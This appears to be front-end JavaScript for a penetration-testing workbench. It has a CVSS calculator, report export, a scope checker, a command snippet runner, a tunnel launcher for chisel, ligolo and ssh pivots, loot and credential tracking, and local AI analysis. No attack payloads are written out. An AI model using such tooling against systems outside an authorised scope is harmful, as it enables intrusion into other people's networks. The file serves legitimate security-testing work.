        return;
    }
    let impact = S === 'U' ? 6.42*ISS : 7.52*(ISS-0.029) - 3.25*Math.pow(ISS-0.02,15);
    const exploit = 8.22 * avN * acN * prN * uiN;
    let raw = S === 'U' ? Math.min(impact+exploit,10) : Math.min(1.08*(impact+exploit),10);
    const score = cvssRoundup(raw);
    const el = document.getElementById('cvss-calc-score');
    el.textContent = score.toFixed(1);
    el.className = 'cvss-score-display ' + (score>=9?'critical':score>=7?'high':score>=4?'medium':score>0?'low':'info');
    document.getElementById('cvss-vector-str').textContent = `CVSS:3.1/${buildVector()}`;
}

function cvssRoundup(n) {
    const x = Math.round(n * 100000);
    return x % 10000 === 0 ? x/100000 : (Math.floor(x/10000)+1)/10;
}

function buildVector() {
    const { AV, AC, PR, UI, S, C, I, A } = _cvssState;
    return `AV:${AV}/AC:${AC}/PR:${PR}/UI:${UI}/S:${S}/C:${C}/I:${I}/A:${A}`;
}

function applyCVSSScore() {
    const score = parseFloat(document.getElementById('cvss-calc-score').textContent);
    if (!isNaN(score)) {
        document.getElementById('fi-cvss').value = score.toFixed(1);
        const sev = score>=9?'critical':score>=7?'high':score>=4?'medium':score>0?'low':'info';
        document.getElementById('fi-severity').value = sev;
        document.getElementById('cvss-calc-panel').classList.add('d-none');
        toast(`CVSS ${score.toFixed(1)} → Severidad: ${sev}`, 'success');
    }
}


// ══════════════════════════════════════════════════════════════════════════════
//  PDF EXPORT
// ══════════════════════════════════════════════════════════════════════════════

function exportPDFReport() {
    if (!state.activeProject) return;
    window.open(`/api/projects/${state.activeProject.id}/report/pdf`, '_blank');
    toast('Generando PDF...', 'info');
}

function exportWordReport() {
    if (!state.activeProject) return;
    window.open(`/api/projects/${state.activeProject.id}/report/docx`, '_blank');
    toast('Generando informe Word...', 'info');
}

async function enrichCVSS() {
    if (!state.activeProject) return;
    const btn = document.getElementById('enrich-cvss-btn');
    if (btn) { btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enriching...'; }
    try {
        const res = await fetch(`/api/projects/${state.activeProject.id}/findings/enrich-cvss`, { method: 'POST' });
        const data = await res.json();
        if (data.updated !== undefined) {
            toast(`CVSS Enrich: ${data.updated} finding(s) actualizados`, 'success');
            await loadFindings();
        } else {
            toast(data.error || 'Error en CVSS enrich', 'error');
        }
    } catch (e) {
        toast('Error en CVSS enrich: ' + e.message, 'error');
    } finally {
        if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fas fa-shield-halved"></i> Enrich CVSS'; }
    }
}


// ══════════════════════════════════════════════════════════════════════════════
//  EVIDENCE AUTO-COLLECTOR
// ══════════════════════════════════════════════════════════════════════════════

function showEvidenceCollectorModal() {
    if (!state.activeProject) return;
    const job = state.jobs?.find(j => j.id === state.selectedJobId);
    const output = job ? (JOBS_OUTPUT_CACHE[state.selectedJobId] || []).join('\n') : '';
    document.getElementById('ec-evidence-text').value = output.substring(0, 10000);

    // Populate findings dropdown
    const sel = document.getElementById('ec-finding-select');
    const findings = state.activeProject.findings || [];
    sel.innerHTML = '<option value="__new__">➕ Crear nuevo finding</option>' +
        findings.map(f => `<option value="${f.id}">[${f.severity.toUpperCase()}] ${h(f.title)}</option>`).join('');
    sel.onchange = () => {
        document.getElementById('ec-new-finding-fields').classList.toggle('d-none', sel.value !== '__new__');
    };
    document.getElementById('ec-new-finding-fields').classList.add('d-none');
    bsEvidenceCollect.show();
}

async function saveEvidence() {
    const sel = document.getElementById('ec-finding-select');
    const evidenceText = document.getElementById('ec-evidence-text').value.trim();
    const pid = state.activeProject.id;

    if (sel.value === '__new__') {
        const title = document.getElementById('ec-new-title').value.trim();
        const severity = document.getElementById('ec-new-severity').value;
        if (!title) { toast('El título es obligatorio', 'error'); return; }
        const res = await fetch(`/api/projects/${pid}/findings`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ title, severity, evidence: evidenceText }),
        });
        const finding = await res.json();
        state.activeProject.findings = [...(state.activeProject.findings||[]), finding];
    } else {
        const finding = (state.activeProject.findings||[]).find(f => f.id === sel.value);
        if (!finding) return;
        const existing = finding.evidence || '';
        const newEvidence = existing ? existing + '\n\n---\n' + evidenceText : evidenceText;
        await fetch(`/api/projects/${pid}/findings/${sel.value}`, {
            method: 'PUT', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ evidence: newEvidence }),
        });
        finding.evidence = newEvidence;
    }
    bsEvidenceCollect.hide();
    toast('Evidencia guardada en el Finding', 'success');
}


// ══════════════════════════════════════════════════════════════════════════════
//  TARGET SCOPE MANAGER
// ══════════════════════════════════════════════════════════════════════════════

let _scopeData = { includes: [], excludes: [] };

async function showScopeModal() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/scope`);
    const data = await res.json();
    document.getElementById('scope-includes').value = (data.includes||[]).join('\n');
    document.getElementById('scope-excludes').value = (data.excludes||[]).join('\n');
    _scopeData = data;
    bsScope.show();
}

async function saveScope() {
    const includes = document.getElementById('scope-includes').value.split('\n').map(s=>s.trim()).filter(Boolean);
    const excludes = document.getElementById('scope-excludes').value.split('\n').map(s=>s.trim()).filter(Boolean);
    const data = { includes, excludes };
    await fetch(`/api/projects/${state.activeProject.id}/scope`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
    });
    _scopeData = data;
    bsScope.hide();
    toast(`Scope guardado: ${includes.length} entradas`, 'success');
    updateScopeWarning();
}

function checkIPScope() {
    const ip = document.getElementById('scope-check-ip').value.trim();
    const result = document.getElementById('scope-check-result');
    if (!ip) return;
    const inScope = isInScope(ip);
    result.innerHTML = inScope
        ? `<span class="text-success"><i class="fas fa-check-circle"></i> <strong>${h(ip)}</strong> está EN SCOPE</span>`
        : `<span class="text-danger"><i class="fas fa-times-circle"></i> <strong>${h(ip)}</strong> está FUERA DE SCOPE</span>`;
}

function isInScope(ip) {
    if (!_scopeData.includes?.length) return true; // no scope defined = all in scope
    const excluded = (_scopeData.excludes||[]).some(r => ipMatchesRange(ip, r));
    if (excluded) return false;
    return (_scopeData.includes||[]).some(r => ipMatchesRange(ip, r));
}

function ipMatchesRange(ip, range) {
    if (!range) return false;
    if (range === ip || range.toLowerCase() === ip.toLowerCase()) return true;
    if (range.includes('/')) {
        try {
            const [base, bits] = range.split('/');
            const mask = ~((1 << (32 - parseInt(bits))) - 1) >>> 0;
            const baseNum = ipToNum(base);
            const ipNum = ipToNum(ip);
            return (baseNum & mask) === (ipNum & mask);
        } catch { return false; }
    }
    return false;
}

function ipToNum(ip) {
    return ip.split('.').reduce((acc, b) => (acc << 8) + parseInt(b), 0) >>> 0;
}

function updateScopeWarning() {
    const rhost = state.globalVars.rhost;
    const input = document.getElementById('gv-rhost');
    if (!input || !rhost) return;
    if (_scopeData.includes?.length && !isInScope(rhost)) {
        input.classList.add('scope-warning');
        input.title = '⚠️ Este RHOST está FUERA DE SCOPE';
    } else {
        input.classList.remove('scope-warning');
        input.title = '';
    }
}


// ══════════════════════════════════════════════════════════════════════════════
//  SNIPPETS LIBRARY
// ══════════════════════════════════════════════════════════════════════════════

let _snippetsCache = [];

async function loadSnippets() {
    const q = document.getElementById('snippets-search')?.value.trim() || '';
    const cat = document.getElementById('snippets-cat-filter')?.value || '';
    const params = new URLSearchParams();
    if (q) params.set('q', q);
    if (cat) params.set('category', cat);
    const res = await fetch(`/api/snippets?${params}`);
    _snippetsCache = await res.json();
    renderSnippets(_snippetsCache);
}

async function filterSnippets() {
    await loadSnippets();
}

const CAT_COLORS = { recon:'#58a6ff', enum:'#3fb950', exploitation:'#f85149', privesc:'#f0883e',
    ad:'#d29922', web:'#58a6ff', pivoting:'#8b949e', password:'#e879f9', custom:'#6e7681' };

function renderSnippets(snippets) {
    const grid = document.getElementById('snippets-grid');
    if (!snippets.length) {
        grid.innerHTML = '<div class="col-12 text-center text-muted py-5"><i class="fas fa-bookmark fa-2x mb-2 d-block" style="opacity:.3"></i>Sin snippets. Crea el primero.</div>';
        return;
    }
    grid.innerHTML = snippets.map(s => `
        <div class="col-md-6 col-xl-4">
            <div class="snippet-card">
                <div class="d-flex align-items-center gap-2 mb-1">
                    <span class="snippet-cat-badge" style="background:${CAT_COLORS[s.category]||'#6e7681'}20;color:${CAT_COLORS[s.category]||'#6e7681'};border-color:${CAT_COLORS[s.category]||'#6e7681'}40">${h(s.category)}</span>
                    <span class="fw-semibold small flex-grow-1 text-truncate">${h(s.title)}</span>
                </div>
                <div class="snippet-cmd font-monospace">${h(s.command)}</div>
                ${s.notes ? `<div class="text-muted mt-1" style="font-size:11px">${h(s.notes)}</div>` : ''}
                <div class="d-flex gap-1 mt-2">
                    <button class="btn btn-xs btn-outline-secondary" onclick="navigator.clipboard.writeText(${JSON.stringify(applyGlobalVars(s.command))});toast('Copiado','success')" title="Copiar"><i class="fas fa-copy"></i></button>
                    <button class="btn btn-xs btn-outline-success" onclick="runSnippet(${JSON.stringify(s.command)}, ${JSON.stringify(s.title)})" title="Ejecutar en Terminal"><i class="fas fa-play"></i></button>
                    <button class="btn btn-xs btn-outline-info ms-auto" onclick="editSnippet(${JSON.stringify(s.id)})" title="Editar"><i class="fas fa-pen"></i></button>
                    <button class="btn btn-xs btn-outline-danger" onclick="deleteSnippet(${JSON.stringify(s.id)})" title="Eliminar"><i class="fas fa-trash"></i></button>
                </div>
            </div>
        </div>
    `).join('');
}

function applyGlobalVars(cmd) {
    return cmd
        .replace(/{rhost}/g, state.globalVars.rhost || '{rhost}')
        .replace(/{lhost}/g, state.globalVars.lhost || '{lhost}')
        .replace(/{lport}/g, state.globalVars.lport || '{lport}')
        .replace(/{domain}/g, state.globalVars.domain || '{domain}');
}

async function runSnippet(cmd, title) {
    const fullCmd = applyGlobalVars(cmd);
    const jobId = await runCommand(fullCmd, title);
    if (jobId) { loadPhase('terminal'); toast(`Snippet "${title}" → Terminal`, 'success'); }
}

function showAddSnippetModal() {
    document.getElementById('snippet-modal-title').innerHTML = '<i class="fas fa-bookmark text-info"></i> Nuevo Snippet';
    ['sn-title','sn-command','sn-tags','sn-notes'].forEach(id => document.getElementById(id).value = '');
    document.getElementById('sn-category').value = 'custom';
    document.getElementById('sn-editing-id').value = '';
    bsAddSnippet.show();
}

async function saveSnippet() {
    const id = document.getElementById('sn-editing-id').value;
    const data = {
        title: document.getElementById('sn-title').value.trim(),
        command: document.getElementById('sn-command').value.trim(),
        category: document.getElementById('sn-category').value,
        tags: document.getElementById('sn-tags').value.split(',').map(t=>t.trim()).filter(Boolean),
        notes: document.getElementById('sn-notes').value.trim(),
    };
    if (!data.title || !data.command) { toast('Título y comando son obligatorios', 'error'); return; }
    if (id) {
        await fetch(`/api/snippets/${id}`, { method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data) });
        toast('Snippet actualizado', 'success');
    } else {
        await fetch('/api/snippets', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data) });
        toast('Snippet creado', 'success');
    }
    bsAddSnippet.hide();
    await loadSnippets();
}

function editSnippet(id) {
    const s = _snippetsCache.find(x => x.id === id);
    if (!s) return;
    document.getElementById('snippet-modal-title').innerHTML = '<i class="fas fa-pen text-warning"></i> Editar Snippet';
    document.getElementById('sn-title').value = s.title;
    document.getElementById('sn-command').value = s.command;
    document.getElementById('sn-category').value = s.category;
    document.getElementById('sn-tags').value = (s.tags||[]).join(', ');
    document.getElementById('sn-notes').value = s.notes || '';
    document.getElementById('sn-editing-id').value = s.id;
    bsAddSnippet.show();
}

async function deleteSnippet(id) {
    if (!confirm('¿Eliminar este snippet?')) return;
    await fetch(`/api/snippets/${id}`, { method: 'DELETE' });
    await loadSnippets();
    toast('Snippet eliminado', 'info');
}


// ══════════════════════════════════════════════════════════════════════════════
//  TUNNEL / PROXY MANAGER
// ══════════════════════════════════════════════════════════════════════════════

async function loadTunnelTemplates() {
    const res = await fetch('/api/tunnels/templates');
    const templates = await res.json();
    renderTunnelTemplates(templates);
}

function getTunnelVars() {
    return {
        lhost:   state.globalVars.lhost || 'LHOST',
        lport:   state.globalVars.lport || '8888',
        rhost:   state.globalVars.rhost || 'RHOST',
        user:    document.getElementById('tun-user')?.value.trim() || 'user',
        sshport: document.getElementById('tun-sshport')?.value || '22',
        subnet:  document.getElementById('tun-subnet')?.value.trim() || '172.16.10.0',
        fwdport: document.getElementById('tun-fwdport')?.value.trim() || '8080',
    };
}

function fillTunnelCmd(cmd, vars) {
    return cmd
        .replace(/{lhost}/g, vars.lhost).replace(/{lport}/g, vars.lport)
        .replace(/{rhost}/g, vars.rhost).replace(/{user}/g, vars.user)
        .replace(/{sshport}/g, vars.sshport).replace(/{subnet}/g, vars.subnet)
        .replace(/{fwdport}/g, vars.fwdport);
}

function renderTunnelTemplates(templates) {
    const grid = document.getElementById('tunnels-grid');
    const sideLabels = { attacker: '🖥️ Atacante', victim: '🎯 Víctima' };
    const typeColors = { chisel:'#58a6ff', ligolo:'#f0883e', ssh:'#8b949e', sshuttle:'#f85149', msf:'#d29922', config:'#6e7681' };
    grid.innerHTML = templates.map(t => {
        const vars = getTunnelVars();
        const cmd = fillTunnelCmd(t.cmd, vars);
        return `<div class="col-md-6">
            <div class="tunnel-card">
                <div class="d-flex align-items-center gap-2 mb-2">
                    <i class="fas ${t.icon}" style="color:${t.color}"></i>
                    <span class="fw-semibold small">${h(t.name)}</span>
                    <span class="ms-auto" style="font-size:10px;color:${typeColors[t.type]||'#6e7681'};background:${typeColors[t.type]||'#6e7681'}18;padding:2px 7px;border-radius:10px">${h(t.type)}</span>
                </div>
                <div class="text-muted mb-2" style="font-size:11px">${h(t.desc)} · <span style="font-size:10px">${sideLabels[t.side]||''}</span></div>
                <code class="d-block p-2 rounded mb-2 font-monospace" style="background:#0d1117;font-size:11px;word-break:break-all;border:1px solid #30363d">${h(cmd)}</code>
                <div class="d-flex gap-1">
                    <button class="btn btn-xs btn-outline-secondary" onclick="navigator.clipboard.writeText(${JSON.stringify(cmd)});toast('Copiado','success')"><i class="fas fa-copy"></i></button>
                    <button class="btn btn-xs btn-outline-success" onclick="launchTunnel(${JSON.stringify(t.cmd)}, ${JSON.stringify(t.name)})"><i class="fas fa-play"></i> Lanzar</button>
                </div>
            </div>
        </div>`;
    }).join('');
}

async function launchTunnel(cmdTemplate, name) {
    const vars = getTunnelVars();
    const cmd = fillTunnelCmd(cmdTemplate, vars);
    const jobId = await runCommand(cmd, `Tunnel: ${name}`);
    if (jobId) {
        loadPhase('terminal');
        toast(`Tunnel "${name}" lanzado → Terminal`, 'success');
    }
}

async function loadTunnelJobs() {
    const pid = state.activeProject?.id || '';
    const res = await fetch(`/api/jobs?project_id=${pid}`);
    const jobs = await res.json();
    const tunnelJobs = jobs.filter(j => j.tool?.startsWith('Tunnel:') || j.phase === 'tunnel');
    const el = document.getElementById('tunnel-jobs-list');
    if (!tunnelJobs.length) {
        el.innerHTML = '<span class="text-muted">Sin túneles activos</span>';
        return;
    }
    const statusIcon = { running: '🟢', completed: '⚫', error: '🔴', stopped: '🟡' };
    el.innerHTML = `<div class="d-flex flex-wrap gap-2">${tunnelJobs.map(j => `
        <div class="d-flex align-items-center gap-2 p-2 rounded" style="background:var(--bg2);border:1px solid var(--border);font-size:12px">
            <span>${statusIcon[j.status]||'⚫'}</span>
            <span>${h(j.tool)}</span>
            <span class="text-muted">${j.started_at?.substring(11,19)||''}</span>
            <button class="btn btn-xs btn-outline-secondary" onclick="selectJob('${j.id}');loadPhase('terminal')">Ver</button>
        </div>`).join('')}</div>`;
}


// ══════════════════════════════════════════════════════════════════════════════
//  AI / OLLAMA INTEGRATION
// ══════════════════════════════════════════════════════════════════════════════

async function checkOllamaStatus() {
    const badge = document.getElementById('ai-status-badge');
    if (badge) badge.innerHTML = '<span class="text-muted">Verificando...</span>';
    try {
        const res = await fetch('/api/ai/models');
        const data = await res.json();
        if (badge) {
            if (data.available) {
                badge.innerHTML = `<span class="text-success"><i class="fas fa-circle"></i> Ollama activo · ${data.models.length} modelos</span>`;
                const sel = document.getElementById('ai-model');
                if (sel && data.models.length) {
                    const current = sel.value;
                    sel.innerHTML = data.models.map(m => `<option value="${h(m)}" ${m===current?'selected':''}>${h(m)}</option>`).join('');
                }
            } else {
                badge.innerHTML = '<span class="text-danger"><i class="fas fa-circle"></i> Ollama no disponible · ejecuta <code>ollama serve</code></span>';
            }
        }
    } catch {
        if (badge) badge.innerHTML = '<span class="text-muted">Error de conexión</span>';
    }
}

async function runAIAnalysis() {
    const text = document.getElementById('ai-input-text').value.trim();
    const type = document.getElementById('ai-type').value;
    const model = document.getElementById('ai-model').value;
    const customPrompt = document.getElementById('ai-custom-prompt')?.value.trim() || '';
    if (!text) { toast('Introduce texto a analizar', 'error'); return; }

    const responseBox = document.getElementById('ai-response');
    responseBox.innerHTML = '<div class="ai-loading"><i class="fas fa-spinner fa-spin me-2"></i>Analizando con ' + h(model) + '...</div>';

    try {
        const res = await fetch('/api/ai/analyze', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text, type, model, custom_prompt: customPrompt }),
        });
        const data = await res.json();
        if (data.error) {
            responseBox.innerHTML = `<div class="text-danger p-3">${h(data.error)}</div>`;
        } else {
            const html = (data.response || '').replace(/\n/g, '<br>').replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>').replace(/\*(.*?)\*/g, '<em>$1</em>');
            responseBox.innerHTML = `
                <div class="ai-response-header">
                    <span><i class="fas fa-microchip me-1"></i>${h(model)} · ${h(data.prompt_type)}</span>
                    <div class="d-flex gap-1">
                        <button class="btn btn-xs btn-outline-secondary" onclick="navigator.clipboard.writeText(${JSON.stringify(data.response)});toast('Copiado','success')"><i class="fas fa-copy"></i></button>
                        <button class="btn btn-xs btn-outline-warning" onclick="aiResponseToFinding(${JSON.stringify(data.response)})"><i class="fas fa-bug"></i> → Finding</button>
                    </div>
                </div>
                <div class="ai-response-body">${html}</div>`;
        }
    } catch (e) {
        responseBox.innerHTML = `<div class="text-danger p-3">Error: ${h(e.message)}</div>`;
    }
}

function aiImportFromTerminal() {
    const job = state.jobs?.find(j => j.id === state.selectedJobId);
    const lines = JOBS_OUTPUT_CACHE[state.selectedJobId] || [];
    if (!lines.length) { toast('No hay output en el terminal. Selecciona un job.', 'error'); return; }
    document.getElementById('ai-input-text').value = lines.join('\n').substring(0, 6000);
    toast('Output importado desde Terminal', 'success');
}

function aiImportFromLoot() {
    if (!state.activeProject?.loot?.length) { toast('No hay loot en el proyecto', 'error'); return; }
    const text = state.activeProject.loot.map(i => `[${i.type}] ${i.value}`).join('\n');
    document.getElementById('ai-input-text').value = text.substring(0, 6000);
    toast('Loot importado para análisis', 'success');
}

function showAIAnalysisFromTerminal() {
    const lines = JOBS_OUTPUT_CACHE[state.selectedJobId] || [];
    if (!lines.length) { toast('No hay output en el terminal', 'error'); return; }
    loadPhase('ai');
    setTimeout(() => {
        document.getElementById('ai-input-text').value = lines.join('\n').substring(0, 6000);
    }, 100);
}

async function aiResponseToFinding(text) {
    if (!state.activeProject) return;
    // Extract title from first line
    const firstLine = text.split('\n').find(l => l.trim()) || 'AI Finding';
    const title = firstLine.replace(/^#+\s*/, '').replace(/^\*+\s*/, '').substring(0, 80);
    const res = await fetch(`/api/projects/${state.activeProject.id}/findings`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title, severity: 'medium', description: text }),
    });
    const finding = await res.json();
    state.activeProject.findings = [...(state.activeProject.findings||[]), finding];
    toast('Finding creado desde respuesta AI', 'success');
}


async function runCommand(cmd, toolName = 'Custom') {
    if (!state.activeProject) return null;
    const res = await fetch('/api/run', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd, tool: toolName, phase: 'custom', project_id: state.activeProject.id }),
    });
    const data = await res.json();
    return data.job_id;
}


function fmtElapsed(start, end) {
    const s = Math.floor((new Date(end) - new Date(start)) / 1000);
    if (s < 60) return `${s}s`;
    const m = Math.floor(s / 60);
    return `${m}m ${s % 60}s`;
}

function toast(msg, type = 'info') {
    const icons = { success: 'fa-circle-check', error: 'fa-circle-xmark', info: 'fa-circle-info' };
    const el = document.createElement('div');
    el.className = `toast-item ${type}`;
    el.innerHTML = `<i class="fas ${icons[type] || icons.info}"></i> ${h(msg)}`;
    document.getElementById('toast-container').appendChild(el);
    requestAnimationFrame(() => el.classList.add('show'));
    setTimeout(() => { el.classList.remove('show'); setTimeout(() => el.remove(), 250); }, 2500);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
//  DASHBOARD
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const PHASE_LABELS = {
    recon:'Recon', enum:'Enum', exploitation:'Exploit', web_attacks:'Web',
    privesc_windows:'PrivEsc Win', privesc_linux:'PrivEsc Linux',
    pivoting:'Pivoting', ad_attacks:'AD', password_attacks:'Passwords',
    metasploit:'MSF', av_evasion:'AV Evasion', client_side:'Client-Side',
    cloud_aws:'Cloud', custom:'Custom',
};

async function loadDashboard() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}`);
    state.activeProject = await res.json();

    const p        = state.activeProject;
    const findings = p.findings  || [];
    const loot     = p.loot      || [];
    const commands = p.commands  || [];
    const portsRes = await fetch(`/api/projects/${p.id}/ports`);
    const ports    = await portsRes.json();

    // â”€â”€ Stat cards â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    const sevCount = { critical:0, high:0, medium:0, low:0, info:0 };
    findings.forEach(f => { sevCount[f.severity] = (sevCount[f.severity]||0) + 1; });

    // Hero stat cards con nuevo diseño
    const heroStats = [
        { cls: 'dsc-critical', icon: 'fa-skull-crossbones', value: sevCount.critical, label: 'Critical', sub: 'Findings críticos' },
        { cls: 'dsc-high',     icon: 'fa-triangle-exclamation', value: sevCount.high, label: 'High', sub: `+${sevCount.medium} medium` },
        { cls: 'dsc-loot',     icon: 'fa-gem', value: loot.length, label: 'Loot', sub: `${loot.filter(l=>l.type==='credential').length} credenciales` },
        { cls: 'dsc-ports',    icon: 'fa-ethernet', value: ports.length, label: 'Puertos', sub: `${[...new Set(ports.map(p=>p.host))].length} hosts` },
        { cls: 'dsc-cmds',     icon: 'fa-terminal', value: commands.length, label: 'Comandos', sub: 'ejecutados' },
        { cls: 'dsc-check',    icon: 'fa-clipboard-check', value: _checklistPct(p) + '%', label: 'Checklist', sub: 'completado' },
    ];
    document.getElementById('dash-stats-row').innerHTML = heroStats.map(s => `
        <div class="dash-stat-card ${s.cls}">
            <div class="dsc-icon"><i class="fas ${s.icon}"></i></div>
            <div class="dsc-value">${h(String(s.value))}</div>
            <div class="dsc-label">${s.label}</div>
            <div class="dsc-sub">${s.sub}</div>
        </div>`).join('');

    // Critical findings list (right panel)
    const critEl = document.getElementById('dash-critical-list');
    if (critEl) {
        const crit = findings.filter(f => f.severity === 'critical' || f.severity === 'high').slice(0, 15);
        critEl.innerHTML = crit.length ? crit.map(f => `
            <div class="dash-critical-item" onclick="loadPhase('findings')">
                <span class="dci-sev ${h(f.severity)}">${h(f.severity.toUpperCase().substring(0,4))}</span>
                <span class="dci-title">${h(f.title||'—')}</span>
                <span class="dci-host">${h((f.hosts||[])[0]||'')}</span>
            </div>`).join('')
            : '<div class="text-muted small p-3">No hay findings críticos aún</div>';
    }

    // Full Recon stepper
    document.getElementById('full-recon-stepper').classList.toggle('d-none', !state.fullReconActive);
    if (state.fullReconActive) _renderReconStepper();

    // â”€â”€ Chart: Findings by severity â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    _dashChart('chart-findings', 'doughnut', {
        labels: ['Critical','High','Medium','Low','Info'],
        datasets: [{ data: [sevCount.critical, sevCount.high, sevCount.medium, sevCount.low, sevCount.info],
            backgroundColor: ['#f85149','#f0883e','#d29922','#3fb950','#8b949e'],
            borderWidth: 0, hoverOffset: 6 }],
    }, { cutout: '65%' });

    // â”€â”€ Chart: Loot by type â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    const lootTypes = {};
    loot.forEach(l => { lootTypes[l.type] = (lootTypes[l.type]||0) + 1; });
    const lootColorMap = { credential:'#3fb950', hash:'#f85149', flag:'#bc8cff',
                           port:'#58a6ff', note:'#8b949e', url:'#39c5cf' };
    _dashChart('chart-loot', 'bar', {
        labels: Object.keys(lootTypes),
        datasets: [{ data: Object.values(lootTypes),
            backgroundColor: Object.keys(lootTypes).map(t => lootColorMap[t] || '#58a6ff'),
            borderRadius: 4, borderWidth: 0 }],
    }, { indexAxis:'y', plugins:{ legend:{ display:false } },
         scales:{ x:{ ticks:{ color:'#8b949e' }, grid:{ color:'#21262d' } },
                  y:{ ticks:{ color:'#8b949e' }, grid:{ color:'#21262d' } } } });

    // â”€â”€ Chart: Ports by service â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    const svcCount = {};
    ports.forEach(pt => { const s = pt.service || 'unknown'; svcCount[s] = (svcCount[s]||0) + 1; });
    const topSvcs = Object.entries(svcCount).sort((a,b) => b[1]-a[1]).slice(0, 8);
    _dashChart('chart-ports', 'bar', {
        labels: topSvcs.map(([s]) => s),
        datasets: [{ data: topSvcs.map(([,c]) => c),
            backgroundColor: '#58a6ff', borderRadius: 4, borderWidth: 0 }],
    }, { plugins:{ legend:{ display:false } },
         scales:{ x:{ ticks:{ color:'#8b949e' }, grid:{ color:'#21262d' } },
                  y:{ ticks:{ color:'#8b949e' }, grid:{ color:'#21262d' } } } });

    // â”€â”€ Chart: Phase coverage (radar) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    const phases   = Object.keys(PHASE_LABELS).filter(k => k !== 'custom');
    const cmdSet   = new Set(commands.map(c => c.phase));
    const jobSet   = new Set(state.jobs.map(j => j.phase));
    const coverage = phases.map(ph => (cmdSet.has(ph) || jobSet.has(ph)) ? 1 : 0);
    _dashChart('chart-phases', 'radar', {
        labels: phases.map(k => PHASE_LABELS[k]),
        datasets: [{ data: coverage,
            backgroundColor: 'rgba(63,185,80,0.15)', borderColor: '#3fb950',
            pointBackgroundColor: '#3fb950', borderWidth: 1.5 }],
    }, { scales:{ r:{ min:0, max:1, ticks:{ display:false },
                       grid:{ color:'#21262d' },
                       pointLabels:{ color:'#8b949e', font:{ size:9 } } } } });

    // â”€â”€ Recent jobs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    const allJobsRes = await fetch(`/api/jobs?project_id=${p.id}`);
    const allJobs = await allJobsRes.json();
    const recent  = allJobs.slice(0, 10);
    const iconMap = { completed:'fa-circle-check text-success',
                      error:'fa-circle-xmark text-danger',
                      stopped:'fa-circle-stop text-warning' };
    document.getElementById('dash-recent-jobs').innerHTML = recent.length
        ? recent.map(j => `
            <div class="dash-job-row" onclick="loadPhase('terminal');selectJob('${h(j.id)}')" style="cursor:pointer">
                <span>${j.status==='running'
                    ? '<span class="spinner-pulse-sm"></span>'
                    : `<i class="fas ${iconMap[j.status]||'fa-circle'}" style="font-size:11px"></i>`}</span>
                <span class="djr-tool">${h(j.tool)}</span>
                <span class="djr-meta">${h(j.phase||'')} Â· ${h(fmtElapsed(j.started_at, j.finished_at||new Date().toISOString()))}</span>
            </div>`).join('')
        : '<div class="text-muted small p-2">Sin jobs ejecutados aÃºn</div>';
}

function _checklistPct(p) {
    const checklist = p.checklist || {};
    if (typeof OSCP_CHECKLIST === 'undefined') return 0;
    const done = OSCP_CHECKLIST.filter(i => checklist[i.id]).length;
    return OSCP_CHECKLIST.length ? Math.round(done / OSCP_CHECKLIST.length * 100) : 0;
}

function _dashChart(canvasId, type, data, extraOpts) {
    extraOpts = extraOpts || {};
    const canvas = document.getElementById(canvasId);
    if (!canvas) return;
    if (state.dashCharts[canvasId]) { state.dashCharts[canvasId].destroy(); }
    const scales = (type === 'bar' || type === 'line')
        ? { x:{ ticks:{ color:'#8b949e', font:{ size:10 } }, grid:{ color:'#21262d' } },
            y:{ ticks:{ color:'#8b949e', font:{ size:10 } }, grid:{ color:'#21262d' } },
            ...(extraOpts.scales || {}) }
        : (extraOpts.scales || {});
    state.dashCharts[canvasId] = new Chart(canvas, {
        type,
        data,
        options: Object.assign({
            responsive: true,
            maintainAspectRatio: false,
            animation: { duration: 600 },
            plugins: { legend: { labels: { color:'#8b949e', font:{ size:11 } } } },
            scales,
        }, extraOpts),
    });
}
